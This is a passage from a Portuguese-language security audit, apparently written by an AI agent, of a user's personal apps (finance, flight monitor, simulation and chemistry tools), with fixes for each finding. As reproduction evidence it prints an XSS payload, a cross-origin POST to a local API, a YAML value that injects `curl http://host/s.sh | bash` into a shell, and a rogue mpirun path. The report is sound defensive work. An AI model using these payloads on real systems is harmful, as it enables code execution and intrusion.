    prazo: typeof i.prazo === "string" ? i.prazo : "",
    desde: typeof i.desde === "string" ? i.desde : "",
    dia:   Number(i.dia) || 0,
    juros: Number(i.juros) || 0,
    parcelas: Number(i.parcelas) || 0,
  }));

// 2) linha 589 — guarda como já existe na linha 464
const meta = [`<span class="chip ${i.cat}">${CATS[i.cat] ? CATS[i.cat].rotulo : i.cat}</span>`];

// 3) linhas 591, 594, 595, 598 — escapar
esc(i.parcelas) / esc(String(i.juros).replace(".", ",")) / esc(i.dia) / esc(i.id)
```

**Toca o fluxo do Yuri:** sim — a importação é o caminho de "restaurar backup" /
"transferir para outro aparelho". O dado não se perde (Exportar/Copiar continuam
funcionando, e reimportar um JSON válido conserta), mas a aba Contas quebra e a
dívida importada desaparece da simulação.

**Verificadores:** caminho real e reprodução **confirmados**; severidade corrigida de
"critical" para **medium** (o gatilho exige colar JSON malformado; não é perda de
dado — o item continua exportável).

---

## PRIORIDADE 6 — Finanças: boot sem distinguir "primeira execução" de "dados perdidos" (MÉDIO)

**Arquivo:** `Financas.html:869-875` (boot) e `:294` (leitura do localStorage)

```js
loadLocal(){ try{ const t = localStorage.getItem(LS_KEY); return t ? JSON.parse(t) : null; }catch{ return null; } },
...
(function boot(){
  const local = Store.loadLocal();
  if (local) S = normalize(local);
  else if (window.QUITA_SEED){ S = normalize(window.QUITA_SEED); S.atualizadoEm = 1; Store.saveLocal(S); }
  render();
  Store.connect();
})();
```
`loadLocal()` engole o erro de parse e devolve `null` — **o app não sabe a diferença**
entre "nunca rodou" e "o estado salvo está corrompido". No segundo caso, ele aplica o
`QUITA_SEED` e **regrava por cima**.

**Correção do gatilho (o que o auditor original alegou estava errado):** com a nuvem
ligada, a linha 317 (`d.atualizadoEm >= S.atualizadoEm`) devolve o plano real, porque o
seed grava `atualizadoEm = 1` e a nuvem tem epoch ms. Ou seja, o caminho de perda real
não é "localStorage corrompido no desktop" — é este:

1. Aparelho A (com `window.claude.use`, ou seja, o artefato Claude.ai) abre o app sem
   localStorage → seed entra com `atualizadoEm = 1` (872).
2. `connect()` acha que a nuvem não tem doc (`snap.exists === false`) → cai em
   `this.save()` (319) → `save()` sobrescreve `S.atualizadoEm = Date.now()` (297) e
   **sobe o seed para a nuvem** como se fosse plano do usuário.
3. Aparelho B tem o plano real, salvo em T1 < T2. Ao abrir: `d.atualizadoEm (T2) >=
   S.atualizadoEm (T1)` → `S = normalize(d.estado)` (317) → **o plano real é
   substituído pelo seed e o localStorage do B é sobrescrito**, sem aviso e sem backup
   do estado anterior.

O `QUITA_SEED` (linha 1) não é um seed de demonstração genérico: é um snapshot do
**plano real do Yuri** (renda 7000, Nubank, Serasa, "Parcela da casa", metas "PC de
cálculo"/"Entrada do carro"). O que se perde é o *delta*: flags `concluida`, histórico
de meses fechados, rendas extras.

**Correção mínima (2 linhas):**
```js
// linha 294 — distinguir "vazio" de "corrompido"
loadLocal(){
  const t = localStorage.getItem(LS_KEY);
  if (!t) return null;
  try{ return JSON.parse(t); }
  catch{ toast("Não consegui ler o plano salvo neste aparelho. O arquivo pode estar corrompido — importe um backup."); return undefined; }  // undefined = corrompido
},
// linha 870-872 — undefined = corrompido: NÃO aplicar o seed
const local = Store.loadLocal();
if (local === undefined){ /* avisar e não sobrescrever */ }
else if (local) S = normalize(local);
else if (window.QUITA_SEED){ ... }
```
E, na linha 297, `save()` não deve promover o seed a "plano do usuário": usar o
`atualizadoEm` que o seed já tem, em vez de `Date.now()`.

**Toca o fluxo do Yuri:** sim, quando ele usa mais de um aparelho. Não toquei nada.

**Verificadores:** caminho real e reprodução **confirmados** (com o gatilho corrigido
para o caso multi-aparelho); severidade corrigida de "critical" para **medium**
(gatilho raro e externo; o plano não é zerado, perde-se o delta).

---

## PRIORIDADE 7 — RadarPassagens: campos numéricos aceitam texto e são injetados no painel (MÉDIO)

**Arquivos:** `app/server.py:39-51` (validação), `app/db.py:127-142` (`_norm_watch`),
`web/app.js:78` e `web/app.js:95` (render sem escape)

`validate_watch` (server.py:39-51) só checa `origem`/`destino` (regex IATA) e
`ida_de`/`ida_ate` (regex de data). **Nenhum campo numérico é validado.** `_norm_watch`
(db.py:128) é `out = {k: w.get(k) for k in WATCH_FIELDS if k in w}` — passa o texto
intacto. A coluna tem afinidade INTEGER, mas o SQLite guarda texto não numérico como
TEXT (confirmado em sqlite3 real) e devolve `str` para o JavaScript.

O painel interpola esses campos **sem `esc()`**, enquanto os vizinhos da mesma linha
usam `esc()`:
- `web/app.js:95`: `${w.passo_dias}`, `${w.max_escalas}`, `${w.volta_apos_dias}`
- `web/app.js:78`: `${w.volta_apos_dias}` (tela de lista, alcance mais largo)

Não há CSP em nenhum lugar do projeto.

**Reprodução real (servidor de pé, porta temporária, banco temporário — o `radar.db`
do Yuri ficou intacto):**
```
POST /api/watches  {"origem":"BEL","destino":"LIS","ida_de":"2026-12-01","ida_ate":"2027-01-31","passo_dias":"<img src=x onerror=alert(document.domain)>"}
→ 201
GET /api/watches   → "passo_dias": "<img src=x onerror=alert(document.domain)>"   (texto cru)
```

**Efeito colateral no app:** `app/monitor.py:22` faz
`passo = max(1, int(w.get("passo_dias") or 1))` → `ValueError` → a exceção sobe para o
`except` de `monitor.py:99-104` e **aborta a verificação diária inteira** (status "erro"),
repetindo a cada 2 h. `monitor.py:54` (`int(w["volta_apos_dias"])`) e `monitor.py:58`
(`max_escalas` passado ao provider) quebram do mesmo jeito.

**Correção (dois pontos):**
```js
// web/app.js:95 e :78 — escapar
a cada ${esc(w.passo_dias)} dia(s) · até ${esc(w.max_escalas)} escala(s) ... volta após ${esc(w.volta_apos_dias)} dias
ida e volta ${esc(w.volta_apos_dias)}d
```
```python
# app/server.py:39 — dentro de validate_watch, validar os numéricos
for k, lo, hi in (("passo_dias", 1, 30), ("max_escalas", 0, 4), ("adultos", 1, 9), ("volta_apos_dias", 1, 120)):
    if k in d and d[k] is not None:
        if not isinstance(d[k], int) or not (lo <= d[k] <= hi):
            return f"{k} deve ser um inteiro entre {lo} e {hi}"
```
(`volta_apos_dias` pode ser `null` legitimamente — o teste tem que aceitar `None`.)

**Toca o fluxo do Yuri:** sim, no painel. Mas o gatilho real é fora do fluxo normal:
o formulário web usa `<input type="number">` (`web/index.html:126-131`) e
`app.js:212-214` converte com `+`, então a UI não produz o payload. O caminho real é
POST direto na API ou `config.yaml` editado à mão.

**Verificadores:** caminho real e reprodução **confirmados** (com servidor real de pé);
severidade corrigida de "high" para **medium** (sem senha e em loopback, autor e
vítima são a mesma pessoa pelo fluxo normal).

---

## PRIORIDADE 8 — RadarPassagens: uma data inválida derruba a rodada de verificação (MÉDIO)

**Arquivos:** `app/server.py:47` (validação de data), `app/monitor.py:19-27` e `:50`
(uso), `app/monitor.py:99-104` (tratamento)

```python
# server.py:47 — regex só
if not re.match(r"^\d{4}-\d{2}-\d{2}$", str(d.get(k, ""))):
    return f"{k} deve estar no formato AAAA-MM-DD"
```
`2026-02-31`, `2026-02-30` e `2026-13-01` **passam**. A comparação da linha 49 é de
string (`d["ida_de"] > d["ida_ate"]`), então não detecta dia inexistente.

Depois, `app/monitor.py:19-27`:
```python
date.fromisoformat(w["ida_de"])   # linha 20 → ValueError: day is out of range for month
date.fromisoformat(w["ida_ate"])  # linha 21
int(w.get("passo_dias"))          # linha 22
```
A chamada está na linha 50, dentro do `for w` (47) e do `try` externo (41). O único
`try` interno (57-62) cobre só a busca no provider. A `ValueError` sobe para o
`except` externo (99-104), que chama `db.finish_run(rid, "erro", resumo)` e **encerra
o laço**.

**Correção de duas partes:**
```python
# (a) app/server.py:47 — validar a data de verdade
from datetime import date
try:
    date.fromisoformat(str(d.get(k, "")))
except ValueError:
    return f"{k} não é uma data existente"
```
```python
# (b) app/monitor.py — isolar o erro por monitoramento
for w in [...]:
    try:
        datas = depart_dates(w)
        ...
    except Exception as e:
        resumo["erros"][w.get("nome", "?")] = f"{type(e).__name__}: {e}"
        continue        # segue para o próximo monitoramento
```
O mesmo `try` precisa cobrir `main.py:20-26` (`seed_watches`), que importa o bloco
`monitoramentos:` do `config.yaml` **sem passar por `validate_watch`**.

**Agravante de opacidade:** a causa fica em `resumo["erro"]` (monitor.py:102), e
`web/app.js:162` só renderiza `rs.erros` → o painel mostra "erro" **sem dizer por quê**.
O `log.exception` vai para stderr, invisível no `RadarPassagens.pyw` (que não chama
`logging.basicConfig`).

**Correção do alcance (o auditor exagerou):** como `db.list_watches` ordena por `id`,
os monitoramentos **anteriores** ao inválido são verificados normalmente na mesma
rodada. Só os posteriores ficam de fora. E o app não crasha — ele marca "erro" e
repete a cada 2 h (monitor.py:128 + `db.ran_today_ok()`, que exige status `ok`).

**Toca o fluxo do Yuri:** sim, se ele digitar uma data à mão no `config.yaml` ou
chamar a API direto. O painel web não produz data inválida (`<input type="date">`).

**Verificadores:** os 3 lentes não refutaram (mecanismo confirmado). Severidade
corrigida de "high" para **medium**.

---

## PRIORIDADE 9 — RadarPassagens: a API não checa a origem da requisição (MÉDIO)

**Arquivo:** `app/server.py:73-80` (`_body`), `:159-195` (`do_POST`/`do_PATCH`/`do_DELETE`)

- `_body()` faz `json.loads(self.rfile.read(n))` **sem olhar o `Content-Type`**.
- `do_POST`/`do_PATCH`/`do_DELETE` só chamam `self._auth()`, que **devolve `True`
  quando a senha está vazia** (server.py:82-84). E `config.yaml:61` tem `senha: ""`.
- **Não existe `do_OPTIONS`**, nem `Origin`, nem `Referer`, em lugar nenhum do app.

**O que é alcançável:** `POST` é método CORS-safelisted e `Content-Type: text/plain`
também. Então uma página web aberta no navegador do Yuri consegue mandar
```js
fetch("http://127.0.0.1:8765/api/watches", {method:"POST", mode:"no-cors",
  headers:{"Content-Type":"text/plain"}, body:'{"origem":"BEL",...}'})
```
sem preflight — e o servidor faz o parse do corpo como JSON. Verificado: `POST` com
`Origin: https://site-hostil.example` → **201, escrita aceita**.

Isso permite **criar monitoramento arbitrário** e **disparar verificação real**
(`POST /api/run` → `monitor.run_in_background` → scraping do Google Voos, gastando cota
das fontes e podendo convidar o Google a bloquear o IP do Yuri).

**O que NÃO é alcançável (corrigindo o auditor):** `DELETE` e `PATCH` **não** são
safelisted → o navegador manda preflight `OPTIONS` → sem `do_OPTIONS`, o
`BaseHTTPRequestHandler` responde **501 Unsupported method** → o preflight falha e o
`DELETE` real nunca é enviado. A exclusão de histórico só é alcançável pelo
pivô XSS da PRIORIDADE 7 (mesma origem, sem preflight).

**Correção mínima (2 pontos):**
```python
# app/server.py — nas rotas de escrita, recusar origem externa
def _origem_ok(self):
    o = self.headers.get("Origin")
    if not o:
        return True                      # curl/app local
    return o in (f"http://127.0.0.1:{self.server.server_port}",
                 f"http://localhost:{self.server.server_port}")
```
```python
# app/server.py:_body — exigir JSON (o front já envia: web/app.js:19)
if "application/json" not in (self.headers.get("Content-Type") or ""):
    raise ValueError("Content-Type deve ser application/json")
```
Exigir `Content-Type: application/json` já torna qualquer `POST` cross-origin elegível a
preflight (que o servidor barra com 501) — mata os dois vetores de uma vez.

**Toca o fluxo do Yuri:** não no uso normal. Só fecha a porta para página hostil.
Mitigações do navegador (Private Network Access / Local Network Access do Chrome 138+)
reduzem a probabilidade, mas não são defesa do app.

**Verificadores:** os 3 lentes não refutaram (com o escopo corrigido: criação de
monitoramento + disparo forçado, **não** deleção cross-origin). Severidade **medium**.

---

## PRIORIDADE 10 — Segredo em log no RadarPassagens (BAIXO — o relatório original exagerou)

**O que a auditoria inicial alegava, e o que é verdade:**
- ❌ *"a api_key da SerpApi vai para o `radar.db` e para o git"* — **FALSO**. O corte de
  `app/monitor.py:60` (`msg = str(e)[:200]`) acontece **antes** de gravar. Medido: o
  valor da `api_key` começa no índice **223** da mensagem e o `token` no **229** — os
  dois **depois** do corte. Ignav e Duffel mandam a credencial em **header**, não na URL.
  O `radar.yml:35` (`git add -f radar.db`) publica só histórico de preços, sem segredo.
- ✅ **o `bot_token` do Telegram aparece no log** — `app/notify.py:19` põe o token no
  path da URL e `notify.py:26` loga a exceção crua; o token ocupa os índices 91-137,
  dentro dos 200. Mas o destino é o **stderr do console** (não há `FileHandler` em
  lugar nenhum), e no único cenário com log durável (GitHub Actions) o valor de
  `secrets.RADAR_TELEGRAM_TOKEN` é mascarado pelo próprio GitHub.

**Resíduo real (não estava no relatório original) — `app/routing.py:88`:**
```python
log.warning("hub %s (%s) falhou: %s", h, p.name, e)
```
Loga a exceção **sem truncar**. Quando `hubs.fonte` aponta para uma fonte com chave
na query string (`app/providers/apis.py:33-42` SerpApi, `:72-78` Travelpayouts), a
**chave completa** vai para o log local.

**Correção mínima (2 linhas):**
```python
# app/notify.py:26
log.warning("Falha no Telegram: %s", type(e).__name__)

# app/routing.py:88
log.warning("hub %s (%s) falhou: %s", h, p.name, type(e).__name__)
```
Se quiser manter o detalhe, sanitizar em vez de trocar:
`str(e).replace(t.get("bot_token", ""), "***")`.

**Toca o fluxo do Yuri:** não. Só muda o texto do log.

**Por que está aqui como BAIXO:** é higiene de log local, sem persistência, sem rede,
sem terceiro envolvido. Mas é a mesma classe do item de OmniRoute (secrets em log) e
custa 2 linhas.

**Verificadores:** o achado original ("api_key no radar.db e no git") foi **refutado**
pelos 3 lentes. O que sobreviveu foi o token do Telegram no log (severidade **low**)
e o resíduo novo do `routing.py:88`.

---

## PRIORIDADE 11 — Textos que mentem depois do bind em loopback (BAIXO, mas o Yuri vê)

O bind do RadarPassagens mudou para `127.0.0.1` (pelo seu pedido), mas dois textos
continuam prometendo acesso pelo celular:

**a) `C:\Users\yuri\OneDrive\Desktop\Claude\RadarPassagens\main.py:64-65`**
```python
for ip in local_ips():
    print(f"  No celular: http://{ip}:{porta}   (mesmo Wi-Fi)")
```
Com o bind em loopback, esse endereço **não funciona mais**. O Yuri copia a linha,
digita no celular e não abre nada.

**Correção (3 linhas):**
```python
if cfg["servidor"].get("host") == "127.0.0.1":
    print("  No celular: nao acessivel (servidor so em 127.0.0.1)")
else:
    for ip in local_ips():
        print(f"  No celular: http://{ip}:{porta}   (mesmo Wi-Fi)")
```

**b) `app/server.py:122`**
```python
"enderecos": [f"http://{ip}:{cfg['servidor']['porta']}" for ip in local_ips()],
```
O `/api/status` devolve os IPs de rede, que o painel mostra como acessíveis
(`web/app.js:158`, cartão "Abrir no celular"). Também mentem.

**Correção (1 linha):**
```python
"enderecos": ([f"http://{ip}:{cfg['servidor']['porta']}"] for ip in local_ips()) if cfg["servidor"].get("host") != "127.0.0.1" else [],
```

**Correção factual importante:** `app/server.py:36` é
`return sorted(i for i in ips if not i.startswith("127."))` — ou seja, ela **exclui** os
loopback e devolve os IPs **de rede**. A direção do achado original estava invertida;
o efeito (anunciar IP de LAN que não está escutando) é o mesmo.

**Toca o fluxo do Yuri:** sim, no texto. Não quebra nada.

**Alternativa se ele quiser o celular:** montar um túnel SSH (o material já existe em
`Claude\ssh_celular\1_instalar_ssh_ADMIN.ps1`, mas o `sshd` **não está instalado** nesta
máquina — a porta 22 não está escutando). Com o túnel, o `127.0.0.1` continua valendo
e o celular acessa pelo celular. É a opção que eu recomendo se o acesso pelo celular
for requisito real.

**Verificadores:** os 3 lentes não refutaram. Severidade **low**.

**✅ CORRIGIDO em 20/10** (autorizado pelo controlador `omniroute-d6`; correção **só de
texto**, sem mudar host/porta/senha e sem mexer no comportamento de rede):
- `main.py:62-68` — agora imprime "No celular: nao acessivel (servidor so responde nesta
  maquina)" quando `cfg["servidor"]["host"] == "127.0.0.1"`, e só lista os IPs de rede
  no outro caso.
- `app/server.py:122` — o campo `"enderecos"` do `/api/status` vem `[]` quando o host é
  `127.0.0.1`; com `0.0.0.0` volta a listar os IPs (o painel `web/app.js:158` usa esse
  campo no cartão "Abrir no celular").
- **Teste:** com o `config.yaml` atual (`host: 127.0.0.1`) a lista sai `[]`; forçando
  `host = "0.0.0.0"` a lista sai com os IPs. Suíte do RadarPassagens: **140 passed**.

---

## PRIORIDADE 12 — `pickle.load` do checkpoint do TriboDEM (BAIXO — verificado em 20/10, era MÉDIO)

**Arquivos:** `tribodem\dem_gpu.py:307-310` e `tribodem\yade_worker.py:2058-2061`

O `pickle.load` desserializa (e executa código) **antes** de qualquer conferência. O
SHA1 conferido depois valida o **CASO**, não a **origem do arquivo** — quem trocar o
`checkpoint_gpu.pkl` por um arquivo malicioso executa código na máquina do Yuri.

**Já feito nesta sessão:** comentário de 3 linhas em cada arquivo, explicando que a
mitigação é `TRIBODEM_SEM_RETOMAR=1` e que a correção de verdade exige assinar o
arquivo ou migrar para npz.

**Ainda não corrigido:** a correção real.

**O que agrava:** o `checkpoint_gpu.pkl` (27,9 MB) fica dentro do OneDrive
(`TriboDEM_Studio` = 1.797 MB / 999 arquivos sincronizados). A nuvem é o vetor de
substituição mais provável.

**VERIFICADO (20/10, lente de caminho real — sobrevive, severidade corrigida
MÉDIO → BAIXO).** O fato técnico está confirmado: o `pickle.load` roda antes de
qualquer conferência (`dem_gpu.py:313-314`, `yade_worker.py:2096-2097`); o `sha1`
(`dem_gpu.py:304`, `yade_worker.py:2072`) cobre o **print do CASO**, não a integridade
do arquivo; e não existe sha256/checksum/assinatura em lugar nenhum do projeto —
os únicos usos de `hashlib` são `Monitor.pyw:43`, `dem_gpu.py:301` e
`yade_worker.py:2070`; o formato é `pickle` puro.

Mas o **caminho real não sustenta exploração por terceiros**:

- o arquivo é **gerado localmente pelo mesmo motor** que vai lê-lo
  (`pickle.dump` em `dem_gpu.py:713` e `yade_worker.py:2082`, escrita atômica via
  `os.replace`);
- ele fica em `~/tribodem_runs/<lote>/<id_caso>` (`runner.py:94`, `runner.py:161-169`)
  — **não há caminho de download**: nenhum `wget`, `curl`, `rsync`, `scp` ou cópia
  de rede do checkpoint;
- o `id_caso` é validado contra travessia de caminho (`runner.py:154-160`);
- o arquivo é **apagado no fim do caso** (`yade_worker.py:2113`, `dem_gpu.py:859`);
- quem conseguisse trocar o arquivo já teria execução de código equivalente na
  mesma conta do Yuri — o `pickle` não amplia a capacidade de ataque.

Ou seja: é **defesa em profundidade**, não uma falha explorável. E o próprio código
já tem o comentário de segurança (`dem_gpu.py:310-312`, `yade_worker.py:2093-2095`)
e a mitigação `TRIBODEM_SEM_RETOMAR=1` (`dem_gpu.py:307`, `yade_worker.py:2090`).

**Correção ao que eu mesmo escrevi antes:** a afirmação "a nuvem é o vetor de
substituição mais provável" **não se sustenta**. Não existe caminho de sincronização
do checkpoint, e a pasta do caso é apagada no fim. O risco do OneDrive é real em
teoria (a pasta inteira é sincronizada), mas **não foi demonstrado** — não há
código que baixe um checkpoint de fora. Prioridade **BAIXO**, não é para hoje.

**Correção real (bloco médio, exige cuidado — não mexer com cálculo rodando):**
assinar o checkpoint (HMAC ou `cryptography` com chave em variável de ambiente) e
verificar a assinatura **antes** do `pickle.load`. Alternativa mais limpa: migrar para
`np.savez` (numpy) que só carrega arrays.

**Toca o fluxo do Yuri:** sim, exige parar lotes e reprocessar. Não é para hoje.

### ✅ CORRIGIDO em 21/10 (papel SEG, `omniroute-09`) — o item 3 do briefing

A "correção real" **foi feita**, em vez de HMAC/assinatura. A auditoria adversarial
acertou o ponto de fundo e o desenho escolhe um caminho mais barato e mais forte:

> O `pickle.load` desserializa (e **executa**) **antes** de qualquer conferência. Por isso
> qualquer hash conferido **depois** do load é teatro: o código já rodou.

A guarda nova (`tribodem/checkpoint.py`, arquivo novo) age **antes** do load, nesta ordem:

1. **Consentimento explícito** — o checkpoint só é lido com `TRIBODEM_RETOMAR_CHECKPOINT=1`
   no ambiente **ou** `"retomar_checkpoint": true` no lote. Sem isso o arquivo **nem é aberto**.
2. **SHA-256 do ARQUIVO conferido ANTES do load** — gravado num sidecar `.sha256` ao lado do
   checkpoint. Se o hash do arquivo não bater, o pickle é **recusado antes de ser
   desserializado** (é aqui que se impede a execução do código embutido).
3. **Caminho restrito** — o checkpoint só é lido de dentro da pasta de execuções
   (`TRIBODEM_RUNS` / `~/tribodem_runs`), nunca de qualquer lugar do disco.

O `runner.py` passa `TRIBODEM_SEM_RETOMAR=1` por padrão (lote desatualizado não desserializa
nada), e a GUI ganhou um checkbox **desligado por padrão** ("Retomar casos interrompidos
(checkpoint)") com tooltip explicando que o checkpoint é um pickle.

**Arquivos:** `tribodem/checkpoint.py` (novo), `tribodem/dem_gpu.py:303-312` + `:718-720`,
`tribodem/yade_worker.py:2071` + `:2084-2097`, `tribodem/runner.py:177-181`,
`tribodem/qt_app.py:186-189` + `:545` + `:575`, `tribodem/i18n.py:20`,
`testes/teste_checkpoint_seguro.py` (novo).

**Teste:** `python testes/teste_checkpoint_seguro.py` → **7 passed**. O teste 3 é o que prova
o ponto: um pickle com `__reduce__` que escreve um arquivo no disco **não executa nada**
quando o hash não bate.

**Status: CORRIGIDO.** Nota: a severidadeBAIXO da PRIORIDADE 12 foi mantida — a correção é
**defesa em profundidade** (o caminho real de exploração continua sendo estreito), mas o
defeito técnico central (código executado antes da conferência) **não existe mais**.

---

## PRIORIDADE 13 — SSH do celular (BAIXO, na verdade está resolvido)

O `Claude\ssh_celular\1_instalar_ssh_ADMIN.ps1` é seguro por construção:
`PasswordAuthentication no`, firewall só em perfil Private, regex de chave
`^ssh-(ed25519|rsa) `, `icacls` travado em Administrators+SYSTEM.

**Verificado agora:** o `sshd.exe` **não está instalado**, a porta 22 **não está
escutando**, `C:\ProgramData\ssh` está vazio. Ou seja: nada está exposto hoje. Se o
Yuri rodar o script um dia, ele continua seguro.

---

## PRIORIDADE 14 — Aviso: `testes/teste_worker.py` já está quebrado (não é meu)

`testes/teste_worker.py:23` falha com `AssertionError: ['Video length: at least 20 s.']`.
O teste passa `video_s=2`, e `experiments.py:545-546` exige `>= 20`. A falha acontece
**antes** de qualquer um dos meus arquivos ser importado. Data do arquivo: 03/10 —
minhas edições são de 19/10.

---

## PRIORIDADE 15 — Flow Calculation: pasta de pseudopotencial entra crua no bash do WSL (ALTO, segurança)

**Arquivo:** `C:\Users\yuri\OneDrive\Desktop\QE\qe-flow\flowcalc\pseudos.py:79`
(mesmo defeito em `:126`, `:168`, `:181`)

```python
# pseudos.py:79
return sorted(_sh(f"cd {pasta} 2>/dev/null && ls -1 | grep -i '\\.upf$' || true", timeout=60).split())
```
`pasta` entra **crua** no script. O texto é interpretado pelo bash do WSL
(`flowcalc/wsl.py:49` → `argv += ["--exec", "bash", "-lc", script]`).

**Cadeia de alcance (grep confirmado):**
- `flowcalc/gui/app.py:284` → `pseudos.listar(self.ed_pseudo.text().strip())`
- `flowcalc/gui/app.py:351` → `pseudos.procurar(els, self.ed_pseudo.text())`
- `flowcalc/gui/app.py:380` → `pseudos.copiar_para(...)`
- `flowcalc/gui/app.py:425` → `pseudos.faltando(pasta, ...)`
- **`flowcalc/gui/app.py:698`** → `self.ed_pseudo.setText(pd)` com o `pseudo_dir` **cru** vindo do
  YAML de fluxo, seguido de `:699 self._preencher_pseudos()` → `listar()`.

**Caso concreto:** um `workflow.yaml` de outra pessoa traz
`parameters.pseudo_dir: "/home/yuri/x; curl http://host/s.sh | bash; #"`. O `config.resolve_paths`
(`config.py:69`) resolve o caminho mas **não remove o `;` nem o `#`**. A GUI joga isso no campo
e dispara a busca de pseudos → o bash do WSL executa o payload com o usuário da sessão
(o mesmo que tem a instalação do QE e a fila compartilhada com o TriboDEM).

**Correção (4 linhas, o padrão já existe no arquivo — `shlex.quote` é importado e usado
nos *nomes* de arquivo, só não nas *pastas*):**
```python
# pseudos.py:79 (listar)
pasta = shlex.quote(pasta)
# pseudos.py:126 (procurar) — envolver o item de pasta do projeto
# pseudos.py:168 (faltando)
pasta = shlex.quote(pasta)
# pseudos.py:181 (copiar_para)
dest = shlex.quote(dest)
```

**Toca o fluxo do Yuri:** sim — é a busca de pseudopotenciais, que roda ao abrir um YAML
de fluxo. Não toca cálculo em andamento.

**Verificadores:** 3 de 3 não refutaram. Severidade mantida em **high**.

---

## PRIORIDADE 16 — Flow Calculation: `_mpi_seguro` aceita caminho absoluto (ALTO → MÉDIO, segurança)

**Arquivo:** `flowcalc/web/server.py:113-135` (função `_mpi_seguro`)

```python
# server.py:123-125
launcher = Path(partes[0]).name.lower()
if launcher not in MPI_PERMITIDOS:
    raise HTTPException(400, ...)
```
A função devolve `partes` **sem alterar** (linha 135). O resultado vai para o YAML
(`server.py:196`) e chega ao executor:
- `flowcalc/executor.py:99` → `self.mpi = shlex.split(...)`
- `flowcalc/executor.py:153` → `cmd = (self.mpi if ...) + [self.exe.get(prog, prog)]`
- `flowcalc/executor.py:176` → `subprocess.run(argv, ...)`

**Caso concreto:** `POST /api/run` com `"mpi_command": "/tmp/atacante/mpirun -np 2"`.
`Path("/tmp/atacante/mpirun").name` = `"mpirun"` → está em `MPI_PERMITIDOS` → passa.
O executor monta `argv = ["/tmp/atacante/mpirun", "-np", "2", "<...>/pw.x"]` e executa o
binário do atacante. O docstring do próprio código (linhas 114-117) promete "nunca um
programa para rodar, nem variável de ambiente (-x LD_PRELOAD=...) e nem caminho" — o
caminho do `argv[0]` **não** é barrado.

**Agravante:** a API web do Flow Calculation **não tem autenticação nenhuma** (grep por
`Depends|api_key|token|Authorization|senha|auth` no servidor: zero ocorrências). O launcher
(`flowcalc/launcher.py:8-10`) documenta `FLOWCALC_HOST=0.0.0.0` como opção — se for usado
isso, a porta 8501 passa a ser execução remota de código.

**Correção mínima (1 linha em `_mpi_seguro`):**
```python
if "/" in partes[0] or "\\" in partes[0]:
    raise HTTPException(400, "mpi_command deve ser o nome do launcher, sem caminho")
```

**Toca o fluxo do Yuri:** não no uso normal (o `mpi_command` padrão é `mpirun`).
Fecha a porta para quem alcança a porta 8501.

**Verificadores:** 3 de 3 não refutaram o defeito; severidade corrigida de **high** para
**medium** (uso local, sem exposição de rede por padrão).

---

## PRIORIDADE 17 — Flow Calculation: dω/dP e γ de Grüneisen casados por índice (MÉDIO→ALTO, resultado científico errado)

**Arquivo:** `flowcalc/analysis.py:234-252` (`mode_pressure_analysis`)

```python
# analysis.py:237-247
series = [(p["pressure_gpa"], p["modes"]) for p in pontos if p.get("modes")]
n = min(len(m) for _p, m in series)          # trunca a série no menor nº de modos, sem avisar
w = np.array([m[i]["frequency_cm-1"] for _p, m in series])
a, b = np.polyfit(P, w, 1)
```
A identidade do modo é **a posição na lista**. Os modos vêm de `parse_dynmat`
(`analysis.py:148-150`) e `parse_vibrations` (CASTEP, `analysis.py:59-60`), que preservam a
ordem de impressão das colunas do dynmat/ph.x — ordem por **representação irreducível**,
não por frequência.

**Dois defeitos no mesmo trecho:**
1. **Casamento por índice** — se dois modos se cruzam entre pressões (degeneração que se
   levanta com a pressão), a linha `i` passa a ser o modo A em 0 GPa e o modo B em 12 GPa.
   O ajuste linear mistura as duas frequências: `dω/dP` sai com módulo e sinal errados e o
   γ (`analysis.py:250`) sai errado do mesmo jeito.
2. **Truncamento silencioso** — `n = min(...)` descarta os modos de maior índice de **todas**
   as pressões sem aviso. O docstring (linhas 235-236) promete "Mudança no número de modos
   indica transição/mudança de célula (registrada)" — **nada é registrado**: `workflow.py:141`
   chama `A.mode_pressure_analysis(...)` e o resultado vai direto para `modes_vs_pressure.csv`
   (`workflow.py:143-147`), sem aviso nenhum em `serie["warnings"]`.

**Correção (dois pontos):**
```python
# (1) casar por proximidade de frequência, com aviso quando a frequência variar demais
#     entre pressões, em vez de casar por índice
# (2) registrar o aviso no workflow.py:141
if len(pontos) and n < max(len(m) for _p, m in series):
    serie.setdefault("warnings", []).append(
        f"Número de modos mudou entre pressões ({n} usados de {max(len(m) for _p, m in series)}); "
        "dω/dP e γ podem estar com a identidade dos modos trocada.")
```
Casamento por sobreposição de autovetores é o correto; o aviso é a proteção mínima e barata.

**Toca o fluxo do Yuri:** sim — é o número científico (`dω/dP`, γ) que ele pode usar num
artigo. Não toca CASTEP nem a fila.

**Verificadores:** 3 de 3 não refutaram. Dois lenses corrigiram a severidade — um para
**high**, um para **critical** ("Confirmed; not refuted... o índice `m[i]` deixa de
corresponder ao mesmo modo físico → dω/dP e γ incorretos em silêncio"). Considerei **high**:
o gatilho exige cruzamento de modos ou mudança de contagem na série.

---

## PRIORIDADE 18 — DA: modelo de IA do usuário é desserializado sem aviso (MÉDIO → BAIXO, verificado)

**Arquivo:** `C:\Users\yuri\OneDrive\Desktop\Claude\DA\raman_phase_analyzer\raman_ai.py:537`

```python
# raman_ai.py:534-544
@classmethod
def carregar(cls, caminho=CAMINHO_MODELO_PADRAO) -> "RamanPeakAI":
    origem = Path(caminho).expanduser()
    dados = joblib.load(origem)            # <-- desserializa (executa código) sem checar nada
    if dados.get("formato") != FORMATO_MODELO or ...
```
`joblib.load` executa o objeto antes de qualquer conferência. O caminho padrão é
`~/.raman_phase_analyzer/raman_peak_ai.joblib` (`raman_ai.py:37`).

**Estado: verificado por 3 lentes adversárias — sobrevive 2 de 3, severidade corrigida
ALTO → BAIXO.** Motivos da correção:
1. **A premissa do OneDrive está errada.** `Path.home()` = `C:\Users\yuri`, então o arquivo
   fica em `C:\Users\yuri\.raman_phase_analyzer\` — **fora** da árvore `C:\Users\yuri\OneDrive`.
   Só o modelo **embutido** (`raman_ai.py:38`, dentro de `DA\raman_phase_analyzer\`) está
   na árvore sincronizada.
2. **O vetor OneDrive do achado não se reproduz no executável.** O `RamanPhaseAnalyzer.spec:4`
   embute apenas `assets`; não há `.joblib` em `Executável\dist`. Rodando do código-fonte,
   o modelo embutido existe — mas comprometer a árvore OneDrive já dá acesso aos `.py`,
   caminho mais fácil que o `.joblib`.
3. **Não existe UI de importação de modelo.** O `joblib.load` só é alcançável por dois
   caminhos fixos (o da home e o embutido) e pelo `.rpa` — que **já pergunta** antes
   (`gui.py:5265-5273`, `qt_app.py:997-999`). Para escrever no `.raman_phase_analyzer` é preciso
